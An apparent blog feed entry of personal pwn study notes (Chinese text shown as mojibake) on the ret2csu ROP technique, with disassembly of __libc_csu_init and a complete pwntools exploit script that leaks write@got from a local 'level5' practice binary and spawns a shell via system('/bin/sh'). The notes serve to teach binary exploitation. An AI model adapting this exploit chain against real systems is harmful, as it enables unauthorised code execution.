    <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ9ï¼‰- ä¸­çº§ ROPâ€“ret2csu</h1><h2 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†">#</a> å‰ç½®çŸ¥è¯†</h2><p>â€‹é¦–å…ˆæ˜¯ 64 ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼ï¼šå‰å…­ä¸ªå‚æ•°æ˜¯ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨ï¼šrdiã€rsiã€rdxã€rcxã€r8ã€r9ï¼Œä¹‹åçš„é€šè¿‡æ ˆä¼ å‚ã€‚</p><p>â€‹æ¯”å¦‚ï¼š</p><blockquote><p>ä¼ å‚å‡½æ•°å¤§äº 7 ä¸ªï¼š</p><p>H(a,b,c,d,e,f,g,h)</p><p>a-&gt;%rdiã€b-&gt;%rsiã€c-&gt;%rdxã€d-&gt;%rcxã€e-&gt;%r8ã€f-&gt;%r9</p><p>h-&gt;(%esp)</p><p>g-&gt;(%esp)</p><p>call H</p></blockquote><p>â€‹å…ˆçœ‹çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>,b = <span class="number">2</span>,c = <span class="number">3</span>,d = <span class="number">4</span>,e = <span class="number">5</span>,f = <span class="number">6</span>,g = <span class="number">7</span>,h = <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,H(a,b,c,d,e,f,g,h));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c+d+e+f+g+h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹ååæ±‡ç¼–ä¸€ä¸‹ main å‡½æ•°å’Œ H å‡½æ•°çš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0000000000001149 &lt;main&gt;:</span><br><span class="line">    1149:       f3 0f 1e fa             endbr64</span><br><span class="line">    114d:       55                      push   rbp</span><br><span class="line">    114e:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    1151:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1</span><br><span class="line">    115c:       c7 45 e4 02 00 00 00    mov    DWORD PTR [rbp-0x1c],0x2</span><br><span class="line">    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3</span><br><span class="line">    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5</span><br><span class="line">    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7</span><br><span class="line">    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8</span><br><span class="line">    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]</span><br><span class="line">    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]</span><br><span class="line">    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]</span><br><span class="line">    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]</span><br><span class="line">    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]</span><br><span class="line">    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]</span><br><span class="line">    11a1:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]</span><br><span class="line">    11a4:       57                      push   rdi</span><br><span class="line">    11a5:       8b 7d f8                mov    edi,DWORD PTR [rbp-0x8]</span><br><span class="line">    11a8:       57                      push   rdi</span><br><span class="line">    11a9:       89 c7                   mov    edi,eax</span><br><span class="line">    11ab:       e8 1e 00 00 00          call   11ce &lt;H&gt;</span><br><span class="line">    11b0:       48 83 c4 10             add    rsp,0x10</span><br><span class="line">    11b4:       89 c6                   mov    esi,eax</span><br><span class="line">    11b6:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    11bd:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11c2:       e8 89 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class="line">    11c7:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11cc:       c9                      leave</span><br><span class="line">    11cd:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000000011ce &lt;H&gt;:</span><br><span class="line">    11ce:       f3 0f 1e fa             endbr64</span><br><span class="line">    11d2:       55                      push   rbp</span><br><span class="line">    11d3:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    11d6:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">    11d9:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi</span><br><span class="line">    11dc:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx</span><br><span class="line">    11df:       89 4d f0                mov    DWORD PTR [rbp-0x10],ecx</span><br><span class="line">    11e2:       44 89 45 ec             mov    DWORD PTR [rbp-0x14],r8d</span><br><span class="line">    11e6:       44 89 4d e8             mov    DWORD PTR [rbp-0x18],r9d</span><br><span class="line">    11ea:       8b 55 fc                mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">    11ed:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">    11f0:       01 c2                   add    edx,eax</span><br><span class="line">    11f2:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]</span><br><span class="line">    11f5:       01 c2                   add    edx,eax</span><br><span class="line">    11f7:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]</span><br><span class="line">    11fa:       01 c2                   add    edx,eax</span><br><span class="line">    11fc:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">    11ff:       01 c2                   add    edx,eax</span><br><span class="line">    1201:       8b 45 e8                mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">    1204:       01 c2                   add    edx,eax</span><br><span class="line">    1206:       8b 45 10                mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">    1209:       01 c2                   add    edx,eax</span><br><span class="line">    120b:       8b 45 18                mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">    120e:       01 d0                   add    eax,edx</span><br><span class="line">    1210:       5d                      pop    rbp</span><br><span class="line">    1211:       c3                      ret</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾çš„å°±æ˜¯å‰å…­ä¸ªå‚æ•°æ˜¯å¯„å­˜å™¨ä¼ å‚ï¼Œå‰©ä¸‹ä¸¤ä¸ªå°±æ˜¯æ ˆä¼ å‚ã€‚</p><h2 id="libc_csu_initå‡½æ•°åŸºç¡€"><a class="markdownIt-Anchor" href="#libc_csu_initå‡½æ•°åŸºç¡€">#</a>  <code>libc_csu_init</code>  å‡½æ•°åŸºç¡€ï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000001220                 public __libc_csu_init</span><br><span class="line">.text:0000000000001220 __libc_csu_init proc near               ; DATA XREF: _start+1Aâ†‘o</span><br><span class="line">.text:0000000000001220 ; __unwind &#123;</span><br><span class="line">.text:0000000000001220                 endbr64</span><br><span class="line">.text:0000000000001224                 push    r15</span><br><span class="line">.text:0000000000001226                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000000122D                 push    r14</span><br><span class="line">.text:000000000000122F                 mov     r14, rdx</span><br><span class="line">.text:0000000000001232                 push    r13</span><br><span class="line">.text:0000000000001234                 mov     r13, rsi</span><br><span class="line">.text:0000000000001237                 push    r12</span><br><span class="line">.text:0000000000001239                 mov     r12d, edi</span><br><span class="line">.text:000000000000123C                 push    rbp</span><br><span class="line">.text:000000000000123D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000001244                 push    rbx</span><br><span class="line">.text:0000000000001245                 sub     rbp, r15</span><br><span class="line">.text:0000000000001248                 sub     rsp, 8</span><br><span class="line">.text:000000000000124C                 call    _init_proc</span><br><span class="line">.text:0000000000001251                 sar     rbp, 3</span><br><span class="line">.text:0000000000001255                 jz      short loc_1276</span><br><span class="line">.text:0000000000001257                 xor     ebx, ebx</span><br><span class="line">.text:0000000000001259                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000001260</span><br><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br><span class="line">.text:0000000000001276</span><br><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35â†‘j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br><span class="line">.text:0000000000001284 ; &#125; // starts at 1220</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„å‡ ä¸ªç‚¹ï¼Œä¸Šæ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35â†‘j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°äº†è¿™é‡Œå¯ä»¥ä¿®æ”¹ä¸ªåˆ«å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åæ˜¯è¿™å„¿ï¼Œå¯ä»¥ä¿®æ”¹ä¼ å‚ç”¨çš„é‚£å‡ ä¸ªå¯„å­˜å™¨çš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br></pre></td></tr></table></figure><p>â€‹ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ r13 ç­‰å’Œä¼ å‚ç”¨çš„å¯„å­˜å™¨ç›¸å¯¹åº”çš„æ¥è¿›è¡Œ ret2syscall ç­‰æ“ä½œã€‚</p><h2 id="ä¾‹å­"><a class="markdownIt-Anchor" href="#ä¾‹å­">#</a> ä¾‹å­ï¼š</h2><p>â€‹å…ˆçœ‹çœ‹æ¶æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹IDA åˆ†æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åçœ‹çœ‹ <code>__libc_csu_init</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54â†“j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34â†‘j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br></pre></td></tr></table></figure><p>â€‹ç”±ä¸‹é¢è¿™ä¸ªç‚¹å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥æ§åˆ¶çš„å¯„å­˜å™¨ä¸º ediã€rsiã€rdxï¼Œå¦å¤–ï¼Œ <code>call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</code>  è¿˜ä½¿å¾—å¯ä»¥è°ƒç”¨ r12+rbx*8 çš„ä¸€ä¸ªåœ°å€çš„å‡½æ•°ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ r12 æ¥è·³è½¬åˆ° write å‡½æ•°æ¥æ³„éœ² write å‡½æ•°çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡ ret2libc æ¥è·å¾— shellï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a &#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwnå­¦ä¹ ç¬”è®°9-ä¸­çº§ropret2csu&quot;&gt;#&lt;/a&gt; pwn å­¦ä¹ ç¬”è®°ï¼ˆ9ï¼‰- ä¸­çº§ ROPâ€“ret2csu&lt;/h1&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥</summary>
      
    
    
    
    <category term="Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…»" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ8ï¼‰-åˆè¯†æ²™ç®±</title>
    <link href="http://blog.g01den.top/posts/9d5b1ce4.html"/>
    <id>http://blog.g01den.top/posts/9d5b1ce4.html</id>
    <published>2024-08-05T20:04:38.000Z</published>
    <updated>2024-08-05T20:13:34.320Z</updated>
    
